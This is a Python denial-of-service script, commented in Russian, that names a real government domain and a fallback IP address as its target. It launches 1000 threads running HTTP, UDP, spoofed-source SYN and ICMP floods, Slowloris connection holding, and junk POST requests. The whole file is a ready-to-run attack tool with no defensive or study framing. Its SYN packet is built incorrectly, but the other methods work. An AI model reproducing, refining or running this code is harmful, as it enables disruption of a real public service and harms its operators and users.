import socket
import threading
import random
import time
import os
import requests
from concurrent.futures import ThreadPoolExecutor

# Цель
TARGET_DOMAIN = "rkn.gov.ru"
TARGET_IP = None
PORT = 80
THREADS = 1000
STOP = False

def resolve_target():
    global TARGET_IP
    try:
        TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)
        print(f"[+] Цель: {TARGET_DOMAIN} -> {TARGET_IP}")
    except:
        TARGET_IP = "95.173.144.130"  # запасной IP
        print(f"[!] Не удалось разрешить, использую {TARGET_IP}")

# 1. HTTP ФЛУД
def http_flood():
    url = f"http://{TARGET_DOMAIN}"
    headers = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        {"User-Agent": "Mozilla/5.0 (Linux; Android 11)"},
        {"User-Agent": "curl/7.68.0"}
    ]
    while not STOP:
        try:
            h = random.choice(headers)
            requests.get(url, headers=h, timeout=5)
        except:
            pass

# 2. UDP ФЛУД (огромные пакеты)
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = os.urandom(65507)  # максимальный размер UDP
    while not STOP:
        try:
            sock.sendto(packet, (TARGET_IP, PORT))
        except:
            pass

# 3. TCP SYN ФЛУД (сырые сокеты с подменой IP)
def syn_flood():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except:
        return  # если нет прав root, пропускаем
    while not STOP:
        src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        # Заголовок IP + TCP (упрощённо)
        packet = (
            b'\x45\x00\x00\x28' +  # IP ver, len
            src_ip.encode() +
            b'\x00\x00\x40\x06\x00\x00' +
            socket.inet_aton(src_ip) + socket.inet_aton(TARGET_IP) +
            b'\x00\x50\x00\x50\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x20\x00\x00\x00\x00\x00'
        )
        try:
            sock.sendto(packet, (TARGET_IP, 0))
        except:
            pass

# 4. ICMP ФЛУД (пинг)
def icmp_flood():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        return
    packet = b'\x08\x00\x00\x00\x00\x01\x00\x01' + os.urandom(1024)
    while not STOP:
        try:
            sock.sendto(packet, (TARGET_IP, 0))
        except:
            pass

# 5. SLOWLORIS (удержание соединений)
def slowloris():
    sockets = []
    for _ in range(500):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET_IP, PORT))
            s.send(f"GET /{random.randint(0,9999)} HTTP/1.1\r\nHost: {TARGET_DOMAIN}\r\n".encode())
            sockets.append(s)
        except:
            pass
    while not STOP:
        for s in sockets[:]:
            try:
                s.send(f"X-header: {random.randint(1,9999)}\r\n".encode())
            except:
                sockets.remove(s)
        time.sleep(10)

# 6. POST МУСОР (большие данные)
def post_spam():
    junk = os.urandom(1024*1024)  # 1 МБ
    while not STOP:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, PORT))
            request = f"POST / HTTP/1.1\r\nHost: {TARGET_DOMAIN}\r\nContent-Length: {len(junk)}\r\n\r\n".encode() + junk
            s.send(request)
            s.close()
        except:
            pass

# ЗАПУСК
def main():
    resolve_target()
    print(f"[*] Запуск DDoS на {TARGET_DOMAIN} ({TARGET_IP}) с {THREADS} потоками")
    
    methods = [http_flood, udp_flood, syn_flood, icmp_flood, slowloris, post_spam]
    
    for method in methods:
        for _ in range(THREADS // len(methods)):
            t = threading.Thread(target=method, daemon=True)
            t.start()
    
    print("[+] АТАКА АКТИВНА. Нажми Ctrl+C для остановки")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        global STOP
        STOP = True
        print("\n[!] Остановка атаки")

if __name__ == "__main__":
    main()